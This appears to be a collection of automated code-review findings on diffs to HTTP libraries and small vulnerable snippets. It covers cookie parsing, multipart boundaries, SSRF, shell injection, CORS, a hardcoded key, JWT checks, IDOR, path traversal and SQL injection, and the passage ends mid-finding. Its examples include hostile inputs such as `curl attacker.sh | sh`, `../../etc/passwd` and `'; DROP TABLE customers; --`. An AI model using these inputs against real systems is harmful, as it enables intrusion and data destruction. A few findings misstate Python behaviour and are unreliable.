findings.body: close() used to clear the poolmanager; it's now `pass`, since poolmanager is no longer owned by Session. If any caller still relies on close() actually releasing resources, nothing currently would fail since there's no test asserting close() has an effect.

findings.title: Stale docstring for close() method
findings.body: The `close()` method previously had a docstring explaining it closes the PoolManager and pooled connections. The method body is now `pass`, but the docstring was not updated. Remove the stale docstring or document what `close()` now does.

findings.title: Removing `init_poolmanager`/`self.poolmanager` breaks subclasses and other call sites
findings.body: `init_poolmanager()` was a documented extension point that users overrode to customise the PoolManager (e.g. to pin SSL versions), and `self.poolmanager` was read by the transport code that `Request.send()` used. Both the call at `__init__` and the method are gone, so any subclass overriding `init_poolmanager` silently stops taking effect and anything still reaching for `session.poolmanager` raises `AttributeError`. If the attribute is going away, it needs a deprecation shim or a coordinated update of the call sites.

findings.title: Minimal docstring for send() does not document HTTPAdapter
findings.body: The `send()` method docstring is generic: "Send a given PreparedRequest." The implementation now creates an HTTPAdapter instance and delegates to it, a significant architectural change. The docstring should document what adapter is used or clarify the delegation pattern, or the minimal docstring is acceptable if this is internal implementation detail.

findings.title: cookies property returns None on parse failure, crashing callers
findings.body:
In the moved property, the `except Exception` branch assigns `self._cookies = None` and returns it (and caches it, since `hasattr(self, "_cookies")` is then true). Every caller assumes a mapping: `RequestHandler.get_cookie` does `if name in self.request.cookies` (web.py:321) which raises `TypeError: argument of type 'NoneType' is not iterable`, and `clear_all_cookies` does `self.request.cookies.iterkeys()` (web.py:367) which raises `AttributeError`. A single malformed `Cookie:` header from any client therefore turns every cookie read into a 500. Set `self._cookies = Cookie.SimpleCookie()` (an empty jar) in the except branch instead.

Note also a behavioural regression bundled in: the old code called `self.clear_all_cookies()` on a parse error so the bad cookies were expired in the response. HTTPRequest cannot do that, so if that expiry mattered it needs to be reintroduced at the handler level.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, breaking all callers

findings.title: No test covers cookie-parse failure path after refactor
findings.body: The cookies property moved from RequestHandler to HTTPRequest, and its error-handling behavior changed: previously a parse failure called self.clear_all_cookies() (leaving _cookies as an empty SimpleCookie); now it sets self._cookies = None. Downstream callers in web.py (get_cookie's 'name in self.request.cookies' and clear_all_cookies's 'self.request.cookies.iterkeys()') would raise a TypeError if cookies is None. Nothing in this diff exercises a request with a malformed Cookie header through get_cookie or clear_all_cookies, so this regression would pass silently.

findings.title: get_cookie docstring no longer documents actual source
findings.body: The docstring for get_cookie says 'Gets the value of the cookie with the given name, else default.' This no longer reflects that it accesses cookies via self.request.cookies rather than directly. A caller reading only the docstring would understand the intent correctly, but the documentation of *how* it retrieves them is now incomplete. Consider clarifying that cookies come from the request object.

findings.title: Parameter not stripped: `boundary` never matches after `; `
findings.body:
`content_type.split(";")` leaves the leading space that virtually every client emits: for `multipart/form-data; boundary=----abc` the second element is `" boundary=----abc"`, so `field.partition("=")` yields `k == " boundary"` and the `k == "boundary"` test fails. The loop then completes without `break`, the `for ... else` fires, and every well-formed multipart upload is logged as "Invalid multipart/form-data" with `self._request.files`/`arguments` left empty — a silent regression versus the old `split('boundary=', 1)` code, which was insensitive to surrounding whitespace.

Fix by stripping each parameter before partitioning: `k, sep, v = field.strip().partition("=")`. While there, consider stripping surrounding double quotes from `v`, since RFC 2045 permits `boundary="----abc"` and the quoted form would otherwise be passed verbatim to `_parse_mime_body`.

_Also raised by the security agent:_ Boundary parameter never matches: whitespace not stripped before compare

findings.title: New boundary-parsing loop has no test coverage
findings.body: The change reworks how the multipart boundary is extracted from Content-Type (iterating all ';'-separated fields instead of assuming boundary is last), but no test file is included in the diff. Edge cases this logic now depends on — e.g. a parameter appearing before boundary, whitespace around 'boundary' (e.g. 'multipart/form-data; boundary=x' where the field is ' boundary=x' after split, which would fail the exact 'k == "boundary"' comparison), boundary appearing first vs last, or content_type with no boundary at all — are untested. If this logic regresses (e.g. the whitespace issue), nothing would fail.

findings.title: get_host parser disagrees with urlparse (fragment and control chars)
findings.body:
`get_host` splits on `://`, then `/`, then `@`, then `:`, and never considers `#` or rejects control characters in the resulting host.

Consequences:

1. Fragment differential: `get_host('http://google.com#@evil.com/')` returns host `evil.com`. The `/` split leaves `google.com#@evil.com`, then the `@` split discards everything before the `#` as userinfo. `urllib.parse.urlsplit` (and every browser) treats `#` as the start of the fragment and reports host `google.com`. Any caller that validates a URL with the stdlib parser and then connects using `get_host` will connect somewhere other than what it validated — an SSRF / host-allowlist bypass.
2. No character validation on the returned host: `get_host('http://evil.com\r\nX-Injected: 1/')` returns `evil.com\r\nX-Injected: 1`, which is handed to the connection layer and can end up in the request line / Host header on runtimes that do not themselves reject CRLF.

Suggested fix: parse with `urllib.parse.urlsplit` (or at minimum strip at the first `#` before the `@` split) and reject hosts containing characters outside the permitted host charset, raising `LocationParseError`.

Note this appears to be existing behaviour being relocated rather than newly written, but the lines are introduced by this file and a move is a cheap moment to harden them.

findings.title: New parsing/header logic has no accompanying tests in this diff
findings.body: make_headers and get_host contain multiple branches (string/list/bool handling for accept_encoding, scheme/host/port parsing with an error path on invalid port) that are easy to get subtly wrong — e.g. a regression in the '@' or ':' split order, or the accept_encoding list-vs-string branch — and nothing in this diff would catch it. If the surrounding repo already has a test_util.py with these cases covered, this is moot; but no such file is visible in the diff.

findings.title: LocationParseError message contains a literal '%s' instead of the URL
findings.body: The format string `"Failed to parse: %s"` is raised without any interpolation argument, so callers and logs see the literal text `Failed to parse: %s` and lose the only piece of diagnostic information the exception was meant to carry. Should be `raise LocationParseError("Failed to parse: %s" % url)` (note that `url` has already been reassigned by the splits above, so if the original input is wanted it must be captured before line 91).

findings.title: is_connection_dropped returns a list or None, never False
findings.body: The docstring promises a boolean, but the `select` branch (line 117) returns the readable-socket *list* (`[conn.sock]` or `[]`) and the `poll` branch falls off the end of the function returning `None` when no matching event is present. Both values are truthy/falsy in the right direction, so `if is_connection_dropped(conn):` works, but any caller that compares against `False`/`True` (or serialises/logs the value) will misbehave. Make both branches return an explicit bool and add a trailing `return False`.

findings.title: httpx 0.27 -> 0.28 is a minor bump with removals, not a patch
findings.body: The PR describes this as "the latest patch", but 0.27 -> 0.28 crosses a minor version of httpx, which removed several long-deprecated APIs (notably the `proxies=` argument on `Client`/`AsyncClient`, the `app=` shortcut in favour of `transport=ASGITransport(app=...)`, and the default `verify`/`cert` argument handling). Since the floor is only raised (`>=0.28`) and no upper bound is pinned, any call site still passing those arguments will fail at runtime rather than at install time. Please confirm no client construction in the codebase uses `proxies=` or `app=`, and consider stating the real scope of the bump in the changelog entry so future readers do not treat it as a no-risk patch.

findings.title: `HTTPMove.location` now returns a URL instead of the original string
findings.body:
Previously `self.location` was assigned the raw `location` argument, so it was whatever the caller passed (normally a `str`). After this change it is a `yarl.URL`. The documented contract (`docs/web_reference.rst`) states the attribute is "the location the response redirects to, **as the string it was constructed with**", and that application code compares it against configured strings and passes it to `str.startswith`. A `URL` has no `startswith`, so such callers will now raise `AttributeError`, and `==` comparisons against plain strings will silently become `False`. `URL(...)` also normalises/quotes the value, so even `str(self.location)` is not guaranteed to round-trip the input.

If the intent is only to avoid building the `URL` twice, keep the attribute as the original value and use a local:

```python
url = URL(location)
self.headers['Location'] = str(url)
self.location = location
```

If exposing a `URL` is deliberate, it is a breaking API change and needs a separate attribute (e.g. `location_url`) or a documented deprecation.

_Also raised by the security agent:_ location type change can silently defeat redirect-target validation

findings.title: No test guards self.location's type/value after this change
findings.body: The change makes self.location a URL object instead of the original string, which per docs/web_reference.rst is documented as 'the string it was constructed with' and used with str.startswith by application code. If this change is wrong (breaks that contract), no test in this diff would catch it since none is included. A test asserting isinstance(exc.location, str) and that exc.location == original string (and/or that str.startswith works) would be needed to guard this behavior.

findings.title: Documentation contradicts new location attribute type
findings.body: The attribute docstring in docs/web_reference.rst states that HTTPMove.location is 'the string it was constructed with', but line 8 now assigns it as a URL object instead of a string. Callers expecting a string may break. Either update the docstring to reflect that it is now a URL object, or revert to storing the string representation.

findings.title: `if` instead of `while` lets readany return empty bytes before EOF
findings.body:
`_wait` documents that its waiter "is also resolved at the end of a chunk, which can happen with no new data in the buffer, so a caller must re-check its condition after waking rather than assuming data arrived." The `while` loop was exactly that re-check. With a single `if`, control falls through to `self._read_nowait(-1)` after one wake, and when the wake was a chunk boundary (or any other resolution that did not add data) the buffer is still empty and `_eof` is still False, so `readany()` returns an empty result while the stream is not finished.

Callers of `readany()` conventionally treat an empty return as end-of-stream (`while True: chunk = await resp.content.readany(); if not chunk: break`), so this silently truncates responses on an unlucky wake ordering. Restore the `while` loop so the condition is re-evaluated after every wake.

_Also raised by the security agent:_ Single-wait read can return empty buffer, signalling false EOF

findings.title: No test exercises the spurious-wakeup path for readany()
findings.body: The change replaces a `while` loop with a single `if`, removing the re-check after waking that the docstring for `_wait` explicitly warns is necessary ('the waiter is also resolved at the end of a chunk, which can happen with no new data in the buffer, so a caller must re-check its condition after waking'). With `if` instead of `while`, a spurious wakeup with an empty buffer and no EOF will now fall through to `_read_nowait(-1)` and return prematurely (e.g. an empty bytes result) instead of waiting again. No test in the diff or referenced code exercises this scenario (simulating a wake with an empty buffer), so this regression would not be caught.

findings.title: `from adapters import HTTPAdapter` is not the same module and breaks on Py3
findings.body: `from .adapters import HTTPAdapter` and `from adapters import HTTPAdapter` are not equivalent. The dotted form resolves to `requests.adapters`; the undotted form is an absolute import under Python 3 (and under any module using `from __future__ import absolute_import`), so it will raise `ImportError: No module named 'adapters'` unless a top-level `adapters` module happens to be installed — in which case a completely unrelated `HTTPAdapter` gets bound. Because `sessions` is imported at `requests` package import time, this makes `import requests` fail outright. Restore the leading dot.

findings.title: Absolute `from adapters import ...` allows sys.path module hijacking
findings.body:
`from .adapters import HTTPAdapter` unambiguously loads the `adapters` submodule of the `requests` package. `from adapters import HTTPAdapter` instead asks the import machinery for a top-level module named `adapters`, resolved by scanning `sys.path` in order. `sys.path[0]` is the script directory (or the empty-string CWD for `-c`/interactive/`-m` invocations), so any `adapters.py` a local user or a prior stage of a build can drop in that directory is imported and executed in-process, before the real one is ever considered — arbitrary code execution inside every consumer of `requests.Session`. Under implicit relative imports (Python 2 only) the intra-package module happens to win, but that behaviour is exactly the ambiguity being relied on, and it disappears on Python 3, where this line raises `ModuleNotFoundError` unless an attacker-supplied or unrelated `adapters` package is installed.

Restore the explicit relative form (`from .adapters import HTTPAdapter`) or use the fully qualified `from requests.adapters import HTTPAdapter`. The description that this is the "same module" only holds under Python 2's implicit relative import rules.

findings.title: No test exercises import of requests.sessions to catch broken import
findings.body: Changing `from .adapters import HTTPAdapter` to `from adapters import HTTPAdapter` alters module resolution: under Python 3 (and Python 2 with absolute_import semantics) this implicit relative import will fail with ImportError since there is no top-level `adapters` module, only `requests.adapters`. No test in this diff imports `requests.sessions` or exercises `Session`, so nothing would fail to reveal this breakage.

findings.title: Removed None guard: `name in self.request.cookies` raises on unparseable Cookie header
findings.body:
`HTTPRequest.cookies` is documented (and implemented) to return `None` when the `Cookie` header is present but cannot be parsed. With the guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable`, turning a malformed client-supplied cookie header into a 500 for every handler that calls `get_cookie`. The PR description's premise ("cookies is always a mapping after construction") contradicts the property. Restore the guard, or change the property to return an empty mapping instead of `None` — but the latter changes the contract for every other consumer that the docstring says must allow for `None`.

_Also raised by the security agent:_ Removed None guard lets a malformed Cookie header crash get_cookie

findings.title: get_cookie docstring does not document None-safety assumption
findings.body: The `get_cookie` method now assumes `self.request.cookies` is never None (line 3), but its docstring does not document this contract. The parent httpserver.py documentation explicitly states that the cookies property "Set to None when the Cookie header is present but cannot be parsed, so every consumer has to allow for that." A caller reading the get_cookie docstring alone cannot know whether it handles the None case, and will incorrectly assume it does based on that property's documented behaviour.

findings.title: Removed None-guard on get_cookie has no regression test
findings.body: The docstring for `cookies` in httpserver.py explicitly states it is set to None when the Cookie header is present but unparseable. The diff removes the `self.request.cookies is not None` check, which would raise a TypeError (`argument of type 'NoneType' is not iterable`) in that case. No test exists in this PR exercising get_cookie with a malformed Cookie header, so this regression would not be caught by CI.

findings.title: Dropping strip() breaks boundary detection for normal Content-Type headers
findings.body:
A typical header is `Content-Type: multipart/form-data; boundary=----abc`. Splitting on `;` yields `['multipart/form-data', ' boundary=----abc']` — note the leading space that is conventional (and RFC-permitted as OWS) after the separator. With `field.strip()` removed, `field.partition("=")` returns `k == " boundary"`, so the `k == "boundary"` test on line 5 is false and `_parse_mime_body` is never called. The loop then finishes without a match and the multipart body is silently discarded: form fields and file uploads disappear with no error surfaced to the caller.

The same strip also protected the value side (trailing CR/LF or spaces around the boundary token), which now flows unmodified into `_parse_mime_body`.

Restore the strip, e.g. `k, sep, v = field.strip().partition("=")`, or strip `k` and `v` individually.

findings.title: Dropping strip() makes multipart boundary parsing whitespace-dependent
findings.body:
Entry point: the attacker-controlled `Content-Type` request header. Sink: `self._parse_mime_body(v, data)` on line 6, which uses `v` as the MIME delimiter.

`content_type.split(";")` leaves the leading space that virtually every client emits after the separator, so the parameter token is `" boundary"`. With `field.strip()` removed on line 4, `k` is `" boundary"` and the comparison `k == "boundary"` on line 5 fails, so `_parse_mime_body` is never called and the request body is silently discarded — no arguments, no files.

The security consequence is a parser differential that the client chooses. `multipart/form-data;boundary=x` (no space) is parsed by Tornado; `multipart/form-data; boundary=x` (the normal form) is not. Any upstream component — WAF, proxy, logging/inspection middleware, or an application handler that validates `request.files`/`request.body_arguments` — will disagree with Tornado about whether the request carries fields, and an attacker can pick whichever side of the disagreement suits them. Handlers that treat an empty `files`/`arguments` as "nothing to validate" will wave the request through.

Secondly, `strip()` also normalised the value side: with it gone, `v` can retain trailing whitespace or a stray `\r`, and that unnormalised string becomes the boundary passed to `_parse_mime_body`, giving the attacker influence over how body parts are delimited relative to any other parser that does trim.

Restore the strip (`field.strip().partition("=")`), or strip `k` and `v` independently, and consider also stripping surrounding double quotes from the boundary value as RFC 2045 permits them.

findings.title: No test covers content-type parsing with leading whitespace in fields
findings.body: The change drops field.strip() before partition, so a Content-Type header like 'multipart/form-data; boundary=xyz' (with a space after the semicolon, which is the common form) now yields k == ' boundary' instead of 'boundary', causing the boundary match to silently fail. No test in this diff exercises this parsing path, so nothing would catch this regression.

findings.title: No test exercises the malformed port parse-error path
findings.body: The line `raise LocationParseError("Failed to parse: %s")` removed the `% url` substitution, leaving a literal '%s' with no format argument. If invoked, this raises TypeError instead of LocationParseError, but there is no test in this diff that calls parse_url (or equivalent) with a non-digit port to trigger this branch. Nothing would fail to signal this regression.

findings.title: Format placeholder left in message with no argument
findings.body: The string still contains `%s` but the `% url` interpolation was removed, so the exception message renders literally as `Failed to parse: %s`. That is worse than either alternative: it neither shortens the message nor identifies the bad URL, and any caller or log scraper matching on the URL now sees a placeholder. If the intent is to shorten, drop the placeholder too (`"Failed to parse"`); if the URL should be retained, restore `% url`.

findings.title: LocationParseError message no longer includes the problematic URL
findings.body: The error message was changed from 'Failed to parse: %s' (with the URL interpolated) to 'Failed to parse: %s' (literal). This removes valuable diagnostic information from the exception without updating any docstring or contract that might promise callers will receive the URL in the error message. If LocationParseError's docstring or any calling code documents or relies on the URL being present in the message text, this becomes incorrect. The commit message suggests the detail is 'already in the exception type', but that assumes callers access the exception object itself rather than relying on the string representation.

findings.title: Command injection via shell=True in create_archive
findings.body:
`create_archive` interpolates `name` and `directory` into a shell string and executes it with `shell=True`. Any shell metacharacter in either argument is interpreted by `/bin/sh`: `name = "x; curl attacker.sh | sh; #"` or `directory = "/tmp $(id > /tmp/pwn)"` yields arbitrary command execution with the privileges of the process. Additionally `name` is placed directly into the output path, so `name = "../../etc/cron.d/evil"` writes outside `/exports`.

Fix by dropping the shell entirely and passing an argument list, as the adjacent `list_exports` already does:

```python
output = os.path.join("/exports", f"{name}.tar.gz")
if os.path.dirname(os.path.realpath(output)) != "/exports":
    raise ValueError("invalid archive name")
return subprocess.run(["tar", "-czf", output, "--", directory], check=True)
```

and validate `name` against a strict allowlist (e.g. `^[A-Za-z0-9._-]+$`) before use.

findings.title: Unquoted f-string in shell command breaks on spaces/metacharacters
findings.body: `cmd = f"tar -czf /exports/{name}.tar.gz {directory}"` is passed to `subprocess.run(..., shell=True)`, so the shell performs word splitting and glob/metacharacter expansion on the interpolated values. For a reachable input such as `directory="my data"` the shell sees two operands (`my` and `data`) and tar fails or archives the wrong paths; `name="2024 Q1"` writes `/exports/2024` plus a stray `Q1.tar.gz` operand. Values containing `;`, `&`, `$(...)`, `*` or `~` change the command entirely. Since the neighbouring `list_exports` on line 5 already uses the argument-list form, the fix is the same here: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)` with no `shell=True`. That also removes the arbitrary-command-execution exposure this construction carries when `name`/`directory` are caller- or user-supplied.

findings.title: No test coverage for new create_archive function
findings.body: create_archive builds a shell command via string interpolation from `name` and `directory` and executes it with shell=True. There is no test file in this diff exercising this function, so neither correct behavior (archive creation with expected path/contents) nor unsafe input handling would be caught by any test suite before or after this change.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` replaces the `ALLOWED` origin allowlist used by the existing middleware (line 6) with `origin: "*"` while keeping `credentials: true`. Entry point: the `Origin` request header sent by any page a victim visits. Sink: the `Access-Control-Allow-Origin` response header emitted by this middleware on whatever routes it is mounted on. Any site can then issue cookie-bearing cross-origin requests to those routes and read the responses, i.e. classic cross-site request forgery plus authenticated data exfiltration against any logged-in user.

Note the misconfiguration is doubly dangerous: browsers reject a literal `*` ACAO on credentialed requests, so the dashboard will appear broken and the natural next step is to reflect the request `Origin` back, which turns this from "blocked by the browser" into a fully working universal-origin bypass. Any state-changing requests are also exposed via simple requests that never trigger a preflight.

Fix: add the dashboard origin to `ALLOWED` and reuse the existing middleware, or give `dashboardCors` an explicit origin list / a callback that validates against a fixed set of hostnames. Never pair `credentials: true` with a wildcard or an unvalidated reflected origin.

findings.title: origin:"*" with credentials:true is rejected by browsers
findings.body:
`cors({ origin: "*", credentials: true })` emits the literal header `Access-Control-Allow-Origin: *` alongside `Access-Control-Allow-Credentials: true`. The Fetch spec forbids this pair: when a request is made with `credentials: 'include'` (or `withCredentials`), the browser fails the CORS check if the allow-origin header is the wildcard rather than the exact request origin. The PR goal — "so the new dashboard origin can call the API with cookies" — will therefore not be met; the dashboard's credentialed requests will be blocked and the cookies will never be attached.

Fix by reflecting the specific dashboard origin, e.g. add it to the existing `ALLOWED` list used on line 6 and reuse that config, or pass an origin function/array containing the dashboard origin. As a side effect this also avoids exposing a credentialed API to every origin on the internet, which is what the wildcard would mean if a non-browser or misbehaving client honoured it.

findings.title: New CORS config has no test verifying its behavior
findings.body: dashboardCors is a new exported configuration combining origin: "*" with credentials: true. There is no test in this diff exercising it, so if this configuration were changed (e.g., to disallow the invalid wildcard+credentials combination, or to restrict origin properly), nothing would fail to signal the regression. Add a test that constructs a request and asserts the resulting Access-Control-Allow-Origin/Access-Control-Allow-Credentials headers behave as intended.

findings.title: Live AcmePay secret key hardcoded, replacing env var lookup
findings.body:
`ACMEPAY_SECRET_KEY` is committed as a literal on line 4 and assigned to `acmepay.api_key` on line 8, replacing the previous `os.environ["ACMEPAY_SECRET_KEY"]` read (the `import os` line is removed in the same hunk). The `acme_live_` prefix indicates a production credential, not a sandbox one. Anyone with read access to the repository — including CI logs, forks, mirrors, and anyone who ever clones it — can issue charges and read payment data with this key.

Revert to reading the key from the environment or a secrets manager, and treat the committed value as compromised: rotate it in the AcmePay dashboard immediately. Removing the line in a follow-up commit does not help, since the value remains in git history.

findings.title: Hardcoded live key removes per-environment credential configuration
findings.body: `client()` previously read `ACMEPAY_SECRET_KEY` from the environment, so each deployment (production, staging, CI, developer machines) supplied its own credential. After this change the module-level constant `acme_live_...` is assigned unconditionally, so there is no longer any way for a non-production environment to point at a test gateway — every process that calls `client()` will authenticate as the live account and issue real charges. Restore the `os.environ` lookup (optionally with a test-key default or an explicit override parameter) so the credential remains environment-driven, and rotate the key that was committed.

findings.title: No test verifies client() sets acmepay.api_key correctly
findings.body: client() was changed from reading ACMEPAY_SECRET_KEY out of the environment to using a hardcoded module constant. The only test-related change in this PR is a fixture file (tests/fixtures/acmepay.py) that defines a fake_client() helper but is not itself a test and contains no assertions. There is no test that calls client() and asserts acmepay.api_key equals the expected value, so a regression in this function (e.g. wrong key, key not set, wrong return value) would not be caught by anything in this diff.

findings.title: tenant_of returns an unauthenticated, caller-forgeable tenant id
findings.body:
`tenant_of` calls `jwt.decode(...)` with `options={"verify_signature": False}` and no key, so the payload is parsed but never checked against `public_key()`. Anyone able to send a request can hand-craft a token body with any `tenant_id` and this function will return it verbatim. If the result is used to scope queries or pick a tenant context, it is a cross-tenant data access path.

The sibling function `claims_for` on line 7 already does the verified decode. Derive the tenant from it instead, e.g. `return claims_for(token)["tenant_id"]`. If the intent was to avoid a key-store round-trip, cache `public_key()` rather than skipping verification — the round-trip is the cost of the guarantee, not an optional extra.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: No test coverage for new tenant_of() function
findings.body: tenant_of() is a new function that decodes a JWT without verifying its signature and extracts tenant_id. There is no test in this diff exercising it — not for the happy path, not for a missing 'tenant_id' claim (which would raise a KeyError), and not to lock in the (security-relevant) fact that signature verification is skipped. If this logic were changed or broken, nothing would fail.

findings.title: Unguarded dict index raises KeyError for tokens without tenant_id
findings.body: `unverified["tenant_id"]` assumes the claim is always present. Because signature verification is off, this function accepts any syntactically valid JWT, including ones issued for a different audience or purpose that carry no `tenant_id`, and will raise a bare `KeyError` rather than an auth-shaped error the caller can translate into a 401/403. Decide on an explicit contract: either `.get("tenant_id")` returning `None`, or raise a domain exception.

findings.title: Missing ownership check lets any user edit others' payment methods
findings.body:
`update_payment_method` resolves `pm_id` (caller-supplied path/route parameter) via `PaymentMethod.get(pm_id)` and then writes `pm.billing_name` and persists with `pm.save()`, never calling `require_owner`. The retrieved `api/auth.py` states explicitly that `current_user` is "Authentication only — never authorisation" and that "Every object mutation must call" `require_owner`; the sibling read handler two lines above (line 6) does exactly that. As written, any signed-in user can enumerate or guess `pm_id` values and rewrite the billing name on payment methods belonging to other accounts.

Fix: add `require_owner(user, pm)` immediately after the `PaymentMethod.get(pm_id)` on line 12, before any assignment. Note that `user` is currently bound on line 11 and never used, which is the tell that the check was dropped.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unhandled missing body key and possible None from PaymentMethod.get

findings.title: Public API missing authorization documentation
findings.body: The `update_payment_method` function is a public mutation endpoint but has no docstring or inline comment documenting that it performs authorization checks. The repository convention (documented in `api/auth.py`) is that "every object mutation must call [require_owner]". Callers reading this function cannot determine whether authorization is enforced, and the function's behavior contradicts the documented contract.

findings.title: No test exists for update_payment_method authorization/behavior
findings.body: update_payment_method is a new endpoint that mutates state (billing_name) and returns data, similar in shape to the existing get endpoint above it which calls require_owner. There is no test in this diff verifying that a user cannot update another user's payment method, nor one verifying the happy path actually persists the change. If the missing require_owner call were fixed or reverted, nothing here would fail either way.

findings.title: Rate limit removed from unauthenticated password reset endpoint
findings.body:
`request_reset` is an unauthenticated entry point: the caller fully controls `email`, which flows directly into `send_reset_email(email)` on line 2 with no throttle now that the `@rate_limit("5/hour")` decorator and its import have been deleted.

Consequences an attacker can reach with a simple loop:
- Mail-bombing / harassment of any known address, and burning the victim's reset-token slots.
- Cost and reputation damage (provider spend, spam complaints, sender-domain blocklisting).
- Account enumeration and token-generation load, since each call does real work server-side.

The PR rationale — "the email provider already throttles" — does not substitute for the removed control. Provider-side throttling is typically global or per-sending-domain, not per-client-IP or per-target-address, so it caps *your* outbound volume rather than stopping one attacker from flooding one victim; and it applies only after the request has already consumed application resources and generated a token. Restore a per-IP *and* per-target-email limiter at this endpoint. If the goal was to relax the specific `5/hour` value, change the budget rather than deleting the decorator.

Note: I can see the handler signature and the sink in this diff, but not the routing layer, so I am assuming from the `request` parameter and the endpoint name that this is reachable without authentication.

findings.title: Reset endpoint now has no request bound of any kind
findings.body:
`request_reset` previously capped callers at 5/hour; after this change every call path goes straight to `send_reset_email(email)` with no counter, no backoff and no short-circuit. For a reachable input — the same address (or an enumerated list of addresses) submitted in a loop — the function will issue one email per request indefinitely.

The PR description says the email provider throttles, but that throttle is not visible in this function: there is no check of a provider response, no exception handling around `send_reset_email`, and the return value is a hard-coded `{"sent": True}`. So if the provider *does* start rejecting or dropping messages, this endpoint still reports success to the caller, which is an error path that returns success.

If the provider really is the intended control, make that observable here: inspect the result of `send_reset_email` and surface a throttled/failed outcome instead of unconditionally returning `{"sent": True}`. Otherwise keep a local limiter.

findings.title: No test guards the removal of rate limiting on password reset
findings.body: The decorator @rate_limit("5/hour") was removed from request_reset with no accompanying test change. If this removal is wrong (e.g. the email provider throttle assumption doesn't hold), no test would fail — nothing in the diff exercises repeated calls to request_reset to check throttling behaviour is absent or present.

findings.title: Preview path skips _confined(), allowing path traversal
findings.body:
`read_export_preview` builds the file path with `os.path.join(EXPORT_ROOT, name)` directly, while the download function immediately above resolves the same user-supplied `name` through `_confined(name)`. `os.path.join` does not constrain the result: a `name` of `../../etc/passwd` walks out of EXPORT_ROOT, and an absolute `name` such as `/etc/passwd` discards EXPORT_ROOT entirely. The first `limit` bytes of any file readable by the process are then returned to the caller. Route this through the same helper: `path = _confined(name)` before opening, so preview and download share one validation point.

_Also raised by the security agent:_ read_export_preview skips _confined, allowing path traversal

findings.title: Public function lacks docstring; name obscures security contract
findings.body: The new function `read_export_preview` has no docstring and its name does not indicate that it has fundamentally different path-confinement behavior than the preceding `read_export` function (line 14). A caller reading both functions side-by-side would reasonably assume they handle paths the same way, but `read_export` uses `_confined(name)` while `read_export_preview` joins the name directly to `EXPORT_ROOT` without confinement. This difference is a security boundary and must be documented. Add a docstring explaining the path-handling semantics and the security assumptions.

findings.title: No test guards preview path against traversal or confinement bypass
findings.body: read_export_preview builds its path with os.path.join(EXPORT_ROOT, name) directly, unlike the sibling function above which calls _confined(name). Nothing in this diff exercises read_export_preview with a name like '../secret' to verify it is rejected or confined the same way the download path is. Since this is purely a test-coverage gap (the security aspect is for another reviewer), add a test asserting that read_export_preview raises/rejects on a traversal-style name, or refactor it to reuse _confined and add a regression test proving so.

findings.title: Ownership check removed from bulk_export enables cross-tenant IDOR
findings.body:
`bulk_export` takes caller-supplied `report_ids`, loads each `Report` by ID, and serialises it with `to_dict()`. The `require_owner(user, report)` loop that enforced `obj.tenant_id == user.tenant_id` has been deleted along with its import, so authentication is now the only gate. Any authenticated user (including a user of another tenant) who supplies or enumerates arbitrary report IDs receives the full serialised contents of those reports.

Authentication is not authorisation — `current_user(request)` only establishes who the caller is, not that they may read these objects. Restore the check. If the loop was the performance problem, replace it with a tenant-scoped bulk query (e.g. `Report.filter(id__in=report_ids, tenant_id=user.tenant_id)`) and treat any missing ID as not-found, rather than dropping the control; that is both faster than N `require_owner` calls and still enforces the boundary.

_Also raised by the correctness agent:_ bulk_export no longer enforces per-report ownership

findings.title: Public function lacks authorization requirement documentation
findings.body: The `bulk_export` function now relies on callers being pre-authorized to access reports, but has no docstring documenting this expectation. A caller reviewing only this function's signature would not know that no per-report ownership validation occurs, risking cross-tenant data leakage if they assume each report is independently verified. Add a docstring clarifying that authorization is the caller's responsibility, or document the implicit pre-authorization requirement.

findings.title: Removed authorization check has no test guarding it
findings.body: bulk_export no longer calls require_owner on each report, but this diff includes no test change. If a test previously verified that requesting another tenant's report_ids raises Forbidden, it should now fail — but since no test file is touched here, either no such test exists (meaning this security-relevant behavior change is silently uncovered) or an existing test wasn't run/updated as part of this PR. Add or update a test that calls bulk_export with report_ids belonging to a different tenant and asserts Forbidden is raised (or the report is excluded), so this regression would be caught.

findings.title: `user` is now computed but unused
findings.body: With `require_owner` gone, `user` on line 5 has no remaining consumer in the function. That is a signal that the authorization intent was dropped rather than relocated; any fix should re-thread `user.tenant_id` into the report fetch rather than deleting the line.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` concatenates `term` and `status` directly into the SQL string and calls `execute(sql)` with no parameter tuple, so the values are parsed by the database as SQL. A `term` of `' OR '1'='1` dumps the whole customers table; `'; DROP TABLE customers; --` or a `UNION SELECT` against other tables is equally reachable depending on driver multi-statement settings. The PR description says this is fed by a support-facing name/status search, so both arguments are user-supplied strings.

Fix by parameterising, as `get_customer` on line 5 already does and as `billing/db.py` explicitly requires ("`params` must carry every caller value"). Build the LIKE wildcards in Python, not in the SQL text:

    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))

If `status` is drawn from a fixed set, additionally validate it against an allowlist.

_Also raised by the correctness agent:_ None term/status is silently stringified into the query

findings.title: search_customers bypasses execute()'s parameterisation contract
findings.body: `billing/db.execute` documents that `params` "must carry every caller value", and the sibling `get_customer` follows that by passing `%s` placeholders with a tuple. `search_customers` instead formats `term` and `status` directly into the SQL text and calls `execute(sql)` with no params, so every caller-supplied value reaches the database as raw SQL. Build the statement as `"SELECT * FROM customers WHERE name LIKE %s AND status = %s"` and pass `(f"%{term}%", status)` as params.

findings.title: No test coverage for new search_customers query behavior
findings.body: search_customers builds SQL via f-string interpolation instead of using execute's params argument as the existing get_customer does. No test exercises this function, so a regression (or the current injection-prone construction) would not be caught by any test suite. Add a test that calls search_customers and asserts the SQL/params passed to execute are safely parameterised, matching the pattern used for get_customer.

findings.title: verify_endpoint skips the ALLOWED_HOSTS check the sibling path enforces
findings.body:
